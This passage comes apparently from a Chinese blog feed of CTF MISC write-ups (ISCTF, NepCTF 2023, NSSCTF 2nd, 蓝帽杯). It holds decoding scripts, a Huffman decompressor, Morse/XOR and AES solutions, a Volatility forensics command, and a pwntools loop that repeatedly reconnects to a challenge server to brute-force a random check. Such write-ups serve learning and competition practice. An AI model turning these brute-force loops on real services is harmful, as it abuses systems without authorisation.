class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(out)</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x27;大写的乌壹大写的资大写的喔大写的日大写的佛大写的资大写的佛大写的巫基得大写的讷啊勒大写的乌歪大写的特大写的巫壹大写的巫啊大写的乌玖大写的希大写的乌大写的希大写的日大写的资啊科伍日大写的特大写的巫科巫大写的摸大写的鹅壹欺大写的欺摸喝大写的摸大写的迂零科零大写的特讷坡日得大写的佛勒大写的希大写的日摸壹啊玻大写的迂大写的鹅歪大写的特勒大写的日大写的基大写的讷大写的鹅伍大写的乌大写的歪叁坡摸大写的乌大写的特零玖&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="built_in">dict</span> = &#123;</span><br><span class="line">    <span class="string">&#x27;玻&#x27;</span>: <span class="string">&#x27;B&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;坡&#x27;</span>: <span class="string">&#x27;P&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;摸&#x27;</span>: <span class="string">&#x27;M&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;佛&#x27;</span>: <span class="string">&#x27;F&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;得&#x27;</span>: <span class="string">&#x27;D&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;特&#x27;</span>: <span class="string">&#x27;T&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;讷&#x27;</span>: <span class="string">&#x27;N&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;勒&#x27;</span>: <span class="string">&#x27;L&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;哥&#x27;</span>: <span class="string">&#x27;G&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;科&#x27;</span>: <span class="string">&#x27;K&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;喝&#x27;</span>: <span class="string">&#x27;H&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;基&#x27;</span>: <span class="string">&#x27;J&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;欺&#x27;</span>: <span class="string">&#x27;Q&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;希&#x27;</span>: <span class="string">&#x27;X&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;日&#x27;</span>: <span class="string">&#x27;R&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;资&#x27;</span>: <span class="string">&#x27;Z&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;雌&#x27;</span>: <span class="string">&#x27;C&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;思&#x27;</span>: <span class="string">&#x27;S&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;医&#x27;</span>: <span class="string">&#x27;Y&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;巫&#x27;</span>: <span class="string">&#x27;W&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;啊&#x27;</span>: <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;喔&#x27;</span>: <span class="string">&#x27;O&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;鹅&#x27;</span>: <span class="string">&#x27;E&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;衣&#x27;</span>: <span class="string">&#x27;I&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;乌&#x27;</span>: <span class="string">&#x27;U&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;迂&#x27;</span>: <span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;歪&#x27;</span>: <span class="string">&#x27;Y&#x27;</span>, </span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;零&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;壹&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;叁&#x27;</span>: <span class="string">&#x27;3&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;伍&#x27;</span>: <span class="string">&#x27;5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;陆&#x27;</span>: <span class="string">&#x27;6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;玖&#x27;</span>: <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">string = <span class="string">&#x27;大写的乌壹大写的资大写的喔大写的日大写的佛大写的资大写的佛大写的巫基得大写的讷啊勒大写的乌歪大写的特大写的巫壹大写的巫啊大写的乌玖大写的希大写的乌大写的希大写的日大写的资啊科伍日大写的特大写的巫科巫大写的摸大写的鹅壹欺大写的欺摸喝大写的摸大写的迂零科零大写的特讷坡日得大写的佛勒大写的希大写的日摸壹啊玻大写的迂大写的鹅歪大写的特勒大写的日大写的基大写的讷大写的鹅伍大写的乌大写的歪叁坡摸大写的乌大写的特零玖&#x27;</span></span><br><span class="line">out = string.split(<span class="string">&#x27;大写的&#x27;</span>)[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">output = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> out:</span><br><span class="line">    output += <span class="built_in">dict</span>[item[<span class="number">0</span>]]</span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> item[<span class="number">1</span>:]:</span><br><span class="line">        output += <span class="built_in">dict</span>[word].lower()</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(base64.b64decode(output)).decode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># ISCTF&#123;2562eb9d-b3d2-420a-b879-aaffd6528573&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023 NepCTF MISC WP</title>
      <link href="/2023-NepCTF-MISC-WP/"/>
      <url>/2023-NepCTF-MISC-WP/</url>
      
        <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h2><p>NepCTF{H4ve_Fun_1N_This_Game}</p><h2 id="codes"><a href="#codes" class="headerlink" title="codes"></a>codes</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> **argv,<span class="type">char</span>** enp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;enp[i]!=<span class="literal">NULL</span>;i++)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;enp[%d]=%s\n&quot;</span>,i,enp[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023-NepCTF-MISC-WP/1691775387330-23a74e0e-da9a-4699-a4ef-6bcee81e5e74.png" alt="image.png"></p><h2 id="与AI共舞的哈夫曼-方法一"><a href="#与AI共舞的哈夫曼-方法一" class="headerlink" title="与AI共舞的哈夫曼(方法一)"></a>与AI共舞的哈夫曼(方法一)</h2><p><img src="/2023-NepCTF-MISC-WP/1691775744856-950ebf67-71b6-4347-8630-015e8e94f8a4.png" alt="image.png"><br>题目中给出了Nepctf{humanzi6}，可以根据题目huffman compress猜出是Nepctf{huffman_zip_666}</p><h2 id="与AI共舞的哈夫曼-方法二"><a href="#与AI共舞的哈夫曼-方法二" class="headerlink" title="与AI共舞的哈夫曼(方法二)"></a>与AI共舞的哈夫曼(方法二)</h2><p>题目给出代码<br><img src="/2023-NepCTF-MISC-WP/1691775484679-14485bd3-4ac1-42b4-8c91-43d0b46d7a9f.png" alt="image.png"><br>但是没有给出input.txt，根据题目的意思查询ChatGPT后得到结果<br><img src="/2023-NepCTF-MISC-WP/1691775644352-657e04bd-3455-4ef2-85d5-9bad6fd31e8b.png" alt="image.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;询问语句：</span></span><br><span class="line"><span class="string">compress.py的代码...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">这段代码执行后生成了compressed.bin，我没有其余的input.txt，可能已经被写入了compressed.bin，请告诉我如何只通过compressed.bin解压出文件decompressed.txt</span></span><br><span class="line"><span class="string"># 解压缩文件</span></span><br><span class="line"><span class="string">decompress(compressed_file, decompressed_file)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 生成代码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> heapq</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HuffmanNode</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, char, freq</span>):</span><br><span class="line">        self.char = char</span><br><span class="line">        self.freq = freq</span><br><span class="line">        self.left = <span class="literal">None</span></span><br><span class="line">        self.right = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__lt__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">return</span> self.freq &lt; other.freq</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_huffman_tree</span>(<span class="params">frequencies</span>):</span><br><span class="line">    heap = [HuffmanNode(char, freq) <span class="keyword">for</span> char, freq <span class="keyword">in</span> frequencies.items()]</span><br><span class="line">    heapq.heapify(heap)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(heap) &gt; <span class="number">1</span>:</span><br><span class="line">        left = heapq.heappop(heap)</span><br><span class="line">        right = heapq.heappop(heap)</span><br><span class="line">        merged = HuffmanNode(<span class="literal">None</span>, left.freq + right.freq)</span><br><span class="line">        merged.left = left</span><br><span class="line">        merged.right = right</span><br><span class="line">        heapq.heappush(heap, merged)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> heap[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_huffman_codes</span>(<span class="params">node, current_code, huffman_codes</span>):</span><br><span class="line">    <span class="keyword">if</span> node <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> node.char <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        huffman_codes[node.char] = current_code</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    build_huffman_codes(node.left, current_code + <span class="string">&#x27;0&#x27;</span>, huffman_codes)</span><br><span class="line">    build_huffman_codes(node.right, current_code + <span class="string">&#x27;1&#x27;</span>, huffman_codes)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decompress</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line"></span><br><span class="line">    num_symbols = data[<span class="number">0</span>]</span><br><span class="line">    frequencies = &#123;&#125;</span><br><span class="line">    index = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(num_symbols):</span><br><span class="line">        byte = data[index]</span><br><span class="line">        freq = (data[index + <span class="number">1</span>] &lt;&lt; <span class="number">24</span>) + (data[index + <span class="number">2</span>] &lt;&lt; <span class="number">16</span>) + (data[index + <span class="number">3</span>] &lt;&lt; <span class="number">8</span>) + data[index + <span class="number">4</span>]</span><br><span class="line">        frequencies[byte] = freq</span><br><span class="line">        index += <span class="number">5</span></span><br><span class="line"></span><br><span class="line">    root = build_huffman_tree(frequencies)</span><br><span class="line">    huffman_codes = &#123;&#125;</span><br><span class="line">    build_huffman_codes(root, <span class="string">&#x27;&#x27;</span>, huffman_codes)</span><br><span class="line"></span><br><span class="line">    compressed_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(index, <span class="built_in">len</span>(data)):</span><br><span class="line">        byte = data[i]</span><br><span class="line">        compressed_data += <span class="built_in">format</span>(byte, <span class="string">&#x27;08b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    padding = <span class="number">8</span> - <span class="built_in">len</span>(compressed_data) % <span class="number">8</span></span><br><span class="line">    compressed_data = compressed_data[:-padding]</span><br><span class="line"></span><br><span class="line">    current_node = root</span><br><span class="line">    decompressed_data = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> compressed_data:</span><br><span class="line">        <span class="keyword">if</span> bit == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            current_node = current_node.left</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            current_node = current_node.right</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> current_node.char <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            decompressed_data.append(current_node.char)</span><br><span class="line">            current_node = root</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="built_in">bytes</span>(decompressed_data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    compressed_file = <span class="string">&#x27;compressed.bin&#x27;</span></span><br><span class="line">    decompressed_file = <span class="string">&#x27;decompressed.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解压缩文件</span></span><br><span class="line">    decompress(compressed_file, decompressed_file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开 decompressed.txt 得到 Nepctf&#123;huffman_zip_666&#125;</span></span><br></pre></td></tr></table></figure><h2 id="小叮当弹琴"><a href="#小叮当弹琴" class="headerlink" title="小叮当弹琴"></a>小叮当弹琴</h2><p>附件使用Audacity打开，后半部分为16进制<br><img src="/2023-NepCTF-MISC-WP/1691776269248-e2aa9bbf-add4-4faa-85bb-53b75b628dda.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x370A05303C290E045005031C2B1858473A5F052117032C39230F005D1E17</span><br></pre></td></tr></table></figure><p>16进制转码后为一个乱码的文件，猜测是异或，并手动异或Nepctf，发现结果为Yousho，推测前面是莫斯密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Yousho </span><br><span class="line">-.-- --- ..- ... .... ---</span><br></pre></td></tr></table></figure><p>发现能对应头部的点线<br><img src="/2023-NepCTF-MISC-WP/1691776553694-5d50608c-058a-4890-bfd1-7f63fc3d52b8.png" alt="image.png"><br>尝试转码莫斯密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-.-- --- ..- ... .... --- ..- .-.. -.. ..- ... . - .... .. ... - --- -..- --- .-. ... --- -- . - .... .. -. --.</span><br><span class="line">YOUSHOULDUSETHISTOXORSOMETHING</span><br></pre></td></tr></table></figure><p>进行异或，会发现莫斯转码出来的大写字符串输出也是乱码，改小写字符串<br><img src="/2023-NepCTF-MISC-WP/1691776806044-1339ca39-0fab-47a8-a95a-893757d17c4d.png" alt="image.png"><br>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NepCTF&#123;h4ppy_p14N0&#125;</span><br></pre></td></tr></table></figure><h2 id="陌生的语言"><a href="#陌生的语言" class="headerlink" title="陌生的语言"></a>陌生的语言</h2><p><img src="/2023-NepCTF-MISC-WP/1691831636672-bbe5bf39-dcbf-45e5-b3ef-709567124bfa.jpeg" alt="陌生的纸条.jpg"><br>根据hint推测出《小魔女学院》贴吧中查找到相关信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://tieba.baidu.com/p/4960864131?pn=2</span><br><span class="line">https://tieba.baidu.com/p/4960864131?pn=3</span><br></pre></td></tr></table></figure><p><img src="/2023-NepCTF-MISC-WP/1691831731732-bf72859c-75c0-4315-b836-f9cb96dc1a1d.png" alt="image.png"><br><img src="/2023-NepCTF-MISC-WP/1691831771713-3784c412-aa21-43fa-84fb-bb56c5678444.png" alt="image.png"><br>对应码表解出flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NepCTF&#123;NEPNEP_A_BELIEVING_HEART_IS_YOUR_MAGIC&#125;</span><br></pre></td></tr></table></figure><h2 id="connted-five"><a href="#connted-five" class="headerlink" title="connted_five"></a>connted_five</h2><p>五子棋，虽然加了一些机制但是并不重要，只需要连自己的五子即可<br>不过要吐槽一下环境不是很稳定，如果发现棋子不是秒加载直接重新尝试，不然下了很久突然卡住会很崩溃<br><img src="/2023-NepCTF-MISC-WP/1691841572915-2ca7d276-c6a4-4f7c-99d1-789457e2a204.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NepCTF&#123;GomokuPlayingContinousIsFun_310858c17a2c&#125;</span><br></pre></td></tr></table></figure><h2 id="你也喜欢三月七吗"><a href="#你也喜欢三月七吗" class="headerlink" title="你也喜欢三月七吗"></a>你也喜欢三月七吗</h2><p>根据题目信息和题目附件信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">群名：NepCTF 2023</span><br><span class="line">salt:NepCTF2023</span><br><span class="line">算法:SHA256</span><br><span class="line"></span><br><span class="line">salt_lenth= 10 </span><br><span class="line">key_lenth= 16 </span><br><span class="line"></span><br><span class="line">iv= 88219bdee9c396eca3c637c0ea436058 #原始iv转hex的值</span><br><span class="line">ciphertext= b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfed</span><br></pre></td></tr></table></figure><p>推测是群名字取SHA256取前32位得到<br><img src="/2023-NepCTF-MISC-WP/1691895023546-b7719f5b-3e92-4ab1-b384-0f7144bfcb8c.png" alt="image.png"><br>再进行AES解码<br><img src="/2023-NepCTF-MISC-WP/1691894907463-65de208e-c1c2-4c83-8fa2-c6b9d4f985a0.png" alt="image.png"><br>得到一个图片链接<br><img src="/2023-NepCTF-MISC-WP/1691895088742-a38d44f5-c7bc-481b-bf0c-302b1b51e999.png" alt="yOkXWSJT.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/35229002/1691895119679-b151b58e-4a51-4777-9f9f-888c62911470.png?date=1707824141154" alt="1.png"><br>对应码表解出flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NepCTF&#123;HRP_aIways_likes_march_7th&#125;</span><br></pre></td></tr></table></figure><h2 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NepCTF&#123;See_you_in_NepCTF2024&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023 NSSCTF2ND MISC WP</title>
      <link href="/2023-NSSCTF2ND-MISC-WP/"/>
      <url>/2023-NSSCTF2ND-MISC-WP/</url>
      
        <content type="html"><![CDATA[<h2 id="gift-in-qrcode"><a href="#gift-in-qrcode" class="headerlink" title="gift in qrcode"></a>gift in qrcode</h2><p>代码逻辑错误，打印了 target ，只需要输入 target 即可打印 flag<br><img src="/2023-NSSCTF2ND-MISC-WP/1693295578159-0be49813-ee57-498f-ba38-dbecf7c2d3af.png" alt="image.png"></p><h2 id="gift-in-qrcode-revenge"><a href="#gift-in-qrcode-revenge" class="headerlink" title="gift_in_qrcode(revenge)"></a>gift_in_qrcode(revenge)</h2><p><img src="/2023-NSSCTF2ND-MISC-WP/1693295699114-af510eb4-2789-4092-9329-f3bc590f479a.png" alt="image.png"><br>此处随机生成 1~255 的数字，可以直接以固定值去碰撞，概率为 1&#x2F;255</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">count = 0</span><br><span class="line">while True:</span><br><span class="line">    conn = remote(&quot;node6.anna.nssctf.cn&quot;, 28229)</span><br><span class="line">    conn.recvline().decode()</span><br><span class="line">    conn.recvline().decode()</span><br><span class="line">    conn.recv().decode()</span><br><span class="line"></span><br><span class="line">    conn.sendline(str(&#x27;110&#x27;).encode())</span><br><span class="line"></span><br><span class="line">    count += 1</span><br><span class="line">    print(&#x27;count:&#x27;, count)</span><br><span class="line"></span><br><span class="line">    output = conn.recvline().decode()</span><br><span class="line">    if &#x27;No no no!&#x27; not in output:</span><br><span class="line">        print(output)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><p><img src="/2023-NSSCTF2ND-MISC-WP/1693296127742-cdbf069b-b087-4576-b32e-c6eae109d539.png" alt="image.png"></p><h2 id="Magic-Docker"><a href="#Magic-Docker" class="headerlink" title="Magic Docker"></a>Magic Docker</h2><h2 id="New-Terminal"><a href="#New-Terminal" class="headerlink" title="New Terminal"></a>New Terminal</h2><p><img src="/2023-NSSCTF2ND-MISC-WP/1693296515481-ad4f8a1b-dbbb-476b-b619-dd987c269665.png" alt="image.png"><br><img src="/2023-NSSCTF2ND-MISC-WP/1693296559434-0bf65f4c-5dff-4bd1-bf18-943cb0b0910f.png" alt="image.png"><br><img src="/2023-NSSCTF2ND-MISC-WP/1693296607689-10bb2f3b-39e1-476f-ae93-86da2b7b310e.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023 蓝帽杯初赛 MISC WP</title>
      <link href="/2023-%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-MISC-WP/"/>
      <url>/2023-%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-MISC-WP/</url>
      
        <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\HK\Desktop\取证\volatility\VolatilityWorkbench2.6&gt; C:\Users\HK\Desktop\取证\volatility\VolatilityWorkbench2.6\volatility.exe -f C:\Users\HK\Desktop\mem.raw --profile=Win7SP1x64 filescan &gt; ./out.txt</span><br></pre></td></tr></table></figure><p><img src="/2023-%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-MISC-WP/1693047856805-d7631026-f3ad-4978-a23f-f857ab5b96fd.png" alt="image.png"><br><img src="/2023-%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-MISC-WP/1693047845888-25f1fbc7-5ef8-4782-ac7f-6535a0570075.png" alt="image.png"><br><img src="/2023-%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-MISC-WP/1693047870601-2de89b1b-523f-4238-9188-106bcf439bef.png" alt="image.png"><br>但是readme.txt不能明文出压缩包，editbox查看历史<br><img src="/2023-%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-MISC-WP/1693048467553-e454a14f-0fd3-43b7-b102-35392e7abccc.png" alt="image.png"><br><img src="/2023-%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-MISC-WP/1693048651556-46160aa5-87ab-40f1-a405-4d3b52612823.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 